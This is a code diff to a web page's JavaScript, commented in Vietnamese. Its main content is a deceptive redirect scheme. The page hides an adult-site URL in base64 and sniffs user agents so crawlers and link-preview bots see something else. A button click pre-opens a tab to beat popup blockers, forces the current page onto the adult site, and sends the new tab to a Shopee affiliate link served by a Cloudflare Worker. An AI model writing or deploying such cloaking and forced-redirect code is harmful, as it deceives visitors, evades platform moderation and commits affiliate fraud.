@@ -58,7 +58,7 @@ html, body { margin:0; padding:0; height:100%; background:#000; }
 </div>
 
 <script>
-// --- Hàm phụ ---
+// ================== Helpers ==================
 function xorDecode(str, key) {
   let res = '';
   for (let i = 0; i < str.length; i++) {
@@ -75,27 +75,38 @@ const xorKey = "PandaKey2025";
 // --- Mã hóa link 18+ ---
 const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";
 
-// --- Link Shopee theo quốc gia ---
-const affLinks = {
+// --- Fallback map (nếu Worker lỗi) ---
+const fallbackLinks = {
   "VN": "https://s.shopee.vn/30dchvC74f",
   "MY": "https://invl.me/clmwy1t",
   "SG": "https://invl.me/clmwy1m",
   "PH": "https://invl.me/clmwy1v"
 };
+// Lấy quốc gia từ ngôn ngữ trình duyệt (fallback)
+function getCountryByLang() {
+  const lang = (navigator.language || "").toUpperCase();
+  if (lang.includes("VI")) return "VN";
+  if (lang.includes("MS") || lang.includes("MY")) return "MY";
+  if (lang.includes("EN-SG") || lang.includes("SG")) return "SG";
+  if (lang.includes("EN-PH") || lang.includes("PH")) return "PH";
+  return "VN";
+}
 
 // --- Nhận diện bot ---
 function isBot() {
   const ua = (navigator.userAgent || "").toLowerCase();
-  const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
+  const keywords = [
+    "facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot",
+    "bot","crawler","spider","preview","embedly","whatsapp","telegrambot","discordbot"
+  ];
   return keywords.some(k => ua.includes(k)) || navigator.webdriver;
 }
 
-// --- Thiết bị ---
+// --- iOS Chrome ---
 function isIOS() { return /iPad|iPhone|iPod/i.test(navigator.userAgent); }
-function isAndroid() { return /Android/i.test(navigator.userAgent); }
 function isIOSChrome() { return /CriOS/i.test(navigator.userAgent) && isIOS(); }
 
-// --- Điều hướng bền bỉ ---
+// --- Điều hướng 18+ bền bỉ ---
 function navigate18Resilient(url) {
   let done = false;
   let t1 = null, t2 = null, t3 = null;
@@ -134,16 +145,19 @@ function navigate18Resilient(url) {
   document.addEventListener('visibilitychange', onVisibleChange);
 }
 
-// --- Nhận diện quốc gia từ ngôn ngữ trình duyệt ---
-function getCountry() {
-  const lang = (navigator.language || "").toUpperCase();
-  if (lang.includes("VI")) return "VN";
-  if (lang.includes("MS") || lang.includes("MY")) return "MY";
-  if (lang.includes("EN-SG") || lang.includes("SG")) return "SG";
-  if (lang.includes("EN-PH") || lang.includes("PH")) return "PH";
-  return "VN"; // mặc định
+// --- Fetch với timeout (phòng Worker chậm) ---
+function fetchWithTimeout(resource, options = {}) {
+  const { timeout = 1800 } = options;
+  return new Promise((resolve, reject) => {
+    const timer = setTimeout(() => reject(new Error("timeout")), timeout);
+    fetch(resource, options).then(
+      (res) => { clearTimeout(timer); resolve(res); },
+      (err) => { clearTimeout(timer); reject(err); }
+    );
+  });
 }
 
+// ================== Init ==================
 document.addEventListener('DOMContentLoaded', function() {
   const thumbnail = document.getElementById('thumbnail');
   const real = document.getElementById('real-content');
@@ -170,26 +184,49 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 
   // --- Nút CTA ---
-  document.getElementById('ctaBtn').addEventListener('click', function(e){
+  document.getElementById('ctaBtn').addEventListener('click', async function(e){
     e.preventDefault();
 
-    // Lấy quốc gia
-    const country = getCountry();
-    const affLink = affLinks[country] || affLinks["VN"];
+    // 1) PRE-OPEN tab để tránh bị chặn popup
+    let win = null;
+    try { win = window.open('', '_blank'); } catch(_) {}
 
-    // Mở Shopee (tab mới)
-    const a = document.createElement("a");
-    a.href = affLink;
-    a.target = "_blank";
-    a.rel = "noopener noreferrer";
-    document.body.appendChild(a);
-    a.click();
-
-    // Mở link 18+ bền bỉ
+    // 2) BẮT ĐẦU chuyển trang hiện tại sang 18+ (tránh blank)
     const link18 = atob(link18_b64);
     navigate18Resilient(link18);
 
-    setTimeout(() => { try { a.remove(); } catch(_){} }, 5000);
+    // 3) LẤY LINK TỪ WORKER (IP-based), có timeout + fallback
+    let affLink = fallbackLinks[getCountryByLang()] || fallbackLinks["VN"];
+    try {
+      const resp = await fetchWithTimeout(
+        "https://panda-redirect.kitthh1412.workers.dev/link?format=txt",
+        { method: "GET", mode: "cors", cache: "no-store", timeout: 1800 }
+      );
+      if (resp.ok) {
+        const text = (await resp.text() || "").trim();
+        if (/^https?:\/\//i.test(text)) {
+          affLink = text;
+        }
+      }
+    } catch (err) {
+      // im lặng fallback
+      // console.warn("Worker fetch fail:", err);
+    }
+
+    // 4) ĐIỀU HƯỚNG tab mới tới Shopee
+    if (win && !win.closed) {
+      try { win.location.href = affLink; }
+      catch(_) { /* nếu set thất bại, fallback anchor */ }
+    } else {
+      // Fallback anchor click (phòng TH win bị chặn)
+      const a = document.createElement("a");
+      a.href = affLink;
+      a.target = "_blank";
+      a.rel = "noopener noreferrer";
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(() => { try { a.remove(); } catch(_){} }, 5000);
+    }
   });
 });
 </script>
